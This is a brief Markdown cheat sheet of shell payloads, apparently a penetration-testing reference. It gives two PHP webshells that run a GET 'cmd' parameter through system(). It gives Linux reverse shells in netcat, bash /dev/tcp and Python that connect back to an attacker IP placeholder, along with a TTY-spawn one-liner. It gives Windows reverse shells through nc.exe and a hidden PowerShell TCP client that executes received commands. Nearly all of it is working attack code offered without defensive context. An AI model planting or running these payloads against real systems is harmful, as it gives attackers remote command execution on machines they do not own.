# Shell

## Simple PHP webshell 1

`<?php echo system($_GET["cmd"]); ?>`

## Simple PHP webshell 2

```
<html>
	<form method="GET">
		<input type="text" name="cmd" />
		<input type="submit" value="Run" />
	</form>
	<pre><?php echo system($_GET["cmd"]); ?></pre>
</html>
```

## Linux reverse shells

### Netcat

`rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER_IP\> <PORT\> 1\>/tmp/bkpipe`

### Bash

`bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'`

### Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("<ATTACKER_IP",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'`

### Spawn TTY

`python -c "import pty; pty.spawn('/bin/bash');"`

## Windows reverse shells

## Netcat

`nc.exe -e cmd.exe <ATTACKER_IP> <PORT>`

## Powershell

`powershell \-NoP \-NonI \-W Hidden \-Exec Bypass \-Command New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<PORT>);$stream \= $client.GetStream();\[byte\[\]\]$bytes \= 0..65535|%{0};while(($i \= $stream.Read($bytes, 0, $bytes.Length)) \-ne 0){;$data \= (New-Object \-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback \= (iex $data 2>&1 | Out-String );$sendback2  \= $sendback + "PS " + (pwd).Path + "\> ";$sendbyte \= (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`